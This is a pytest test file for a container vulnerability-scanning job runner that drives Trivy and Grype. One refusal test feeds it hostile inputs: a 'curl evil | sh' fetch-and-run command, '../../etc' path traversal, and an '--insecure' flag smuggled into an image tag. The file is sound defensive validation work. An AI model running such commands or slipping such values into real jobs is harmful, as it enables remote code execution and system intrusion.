"""Executing assignments: validation first, then scan, progress, result."""

from __future__ import annotations

import asyncio

import pytest
from conftest import home

from rotsy_runner.executor import Executor
from rotsy_runner.tools import ToolManager


@pytest.fixture
async def ready(config, client, server):
    server.publish_standard()
    tools = ToolManager(config)
    await tools.sync(client)
    return Executor(config, client, tools)


async def test_a_scan_job_runs_both_scanners_and_reports(ready, server, tmp_path):
    job = server.job()
    status = await ready.run(job)
    assert status == "completed"
    results = {r["scanner"]: r for r in server.completed[job["job_uid"]]}
    assert results["trivy"]["ok"] and results["grype"]["ok"]
    assert [f["cve"] for f in results["trivy"]["findings"]] == ["CVE-2024-0001", "CVE-2024-0002"]
    assert results["trivy"]["findings"][0]["cvss"] == 9.8
    assert results["grype"]["findings"][0]["severity"] == "LOW"  # Negligible folded into LOW
    assert results["trivy"]["tool_version"] == "0.73.0"
    percents = [p["percent"] for p in server.progress if p["job_uid"] == job["job_uid"] and p["message"]]
    assert percents == sorted(percents) and percents[-1] == 95

    # The scanners were pointed at the Rotsy registry proxy, with the job's
    # own credential in their environment and nowhere on the command line.
    trivy_args = (home(tmp_path) / "trivy-args").read_text().split("\n")
    assert "rotsy.test:8000/team/app:1.0" in trivy_args
    assert "--image-src" in trivy_args and "remote" in trivy_args
    assert job["target"]["registry"]["password"] not in "\n".join(trivy_args)
    trivy_env = (home(tmp_path) / "trivy-env").read_text()
    assert f"TRIVY_USERNAME={job['target']['registry']['username']}" in trivy_env
    assert "HTTPS_PROXY" not in trivy_env
    grype_args = (home(tmp_path) / "grype-args").read_text()
    assert "registry:rotsy.test:8000/team/app:1.0" in grype_args


async def test_single_scanner_job(ready, server):
    job = server.job(scanners=["grype"])
    assert await ready.run(job) == "completed"
    assert [r["scanner"] for r in server.completed[job["job_uid"]]] == ["grype"]


async def test_scanner_failure_is_a_result_not_a_crash(ready, server, tmp_path):
    (home(tmp_path) / "trivy-mode").write_text("fail")
    job = server.job()
    assert await ready.run(job) == "completed"
    trivy = next(r for r in server.completed[job["job_uid"]] if r["scanner"] == "trivy")
    assert not trivy["ok"] and "unauthorized" in trivy["error"]


@pytest.mark.parametrize(
    "mutate,reason",
    [
        (lambda j: j.update(type="RUN_COMMAND"), "type"),
        (lambda j: j.update(scanners=["nmap"]), "scanners"),
        (lambda j: j.update(command="curl evil | sh"), "command"),
        (lambda j: j["target"].update(image="docker:evil:1", name="docker", tag="evil"), "target"),
        (lambda j: j["target"].update(name="../../etc", image="../../etc:1"), "target"),
        (lambda j: j["target"].update(tag="1 --insecure", image="team/app:1 --insecure"), "target"),
        (lambda j: j["target"].update(image="other/app:1.0"), "target"),
        (lambda j: j["target"]["registry"].update(password="not-a-job-token"), "registry"),
    ],
)
async def test_malformed_or_unauthorized_jobs_are_refused_before_execution(ready, server, tmp_path, mutate, reason):
    job = server.job()
    mutate(job)
    assert await ready.run(job) == "refused"
    assert job["job_uid"] in server.failed
    assert server.failed[job["job_uid"]]["retryable"] is False
    assert reason in server.failed[job["job_uid"]]["error"]
    assert not (home(tmp_path) / "trivy-args").exists()  # nothing executed
    assert not (home(tmp_path) / "grype-args").exists()


async def test_a_job_needing_missing_tools_is_handed_back(config, client, server):
    executor = Executor(config, client, ToolManager(config))
    job = server.job()
    assert await executor.run(job) == "handed-back"
    assert server.failed[job["job_uid"]]["retryable"] is True
    assert "not ready" in server.failed[job["job_uid"]]["error"]


async def test_cancellation_stops_the_scan(ready, server, tmp_path):
    (home(tmp_path) / "trivy-mode").write_text("sleep")
    job = server.job()
    cancel = asyncio.Event()
    task = asyncio.create_task(ready.run(job, cancel))
    await asyncio.sleep(0.5)
    cancel.set()
    assert await asyncio.wait_for(task, 10) == "cancelled"
    assert server.failed[job["job_uid"]]["error"] == "cancelled"
    assert job["job_uid"] not in server.completed


async def test_server_side_cancel_arrives_through_progress(ready, server, tmp_path):
    job = server.job()
    server.cancel.add(job["job_uid"])
    (home(tmp_path) / "trivy-mode").write_text("sleep")
    assert await asyncio.wait_for(ready.run(job), 10) == "cancelled"


async def test_result_delivery_retries_transient_errors(ready, server, monkeypatch):
    job = server.job(scanners=["grype"])
    original = ready._client.complete
    calls = {"n": 0}

    async def flaky(uid, results):
        calls["n"] += 1
        if calls["n"] < 3:
            from rotsy_runner.client import ServerError

            raise ServerError("server restarting")
        return await original(uid, results)

    monkeypatch.setattr(ready._client, "complete", flaky)
    ready.retry_base = 0.0
    assert await ready.run(job) == "completed"
    assert calls["n"] == 3


def test_findings_are_trimmed_to_the_servers_limits():
    from rotsy_runner.protocol import clean_finding

    cleaned = clean_finding({"cve": "", "title": "x" * 5000, "cvss": 42, "package": None})
    assert cleaned["cve"] == "UNKNOWN" and len(cleaned["title"]) == 1024
    assert cleaned["cvss"] == 10.0 and cleaned["package"] == ""
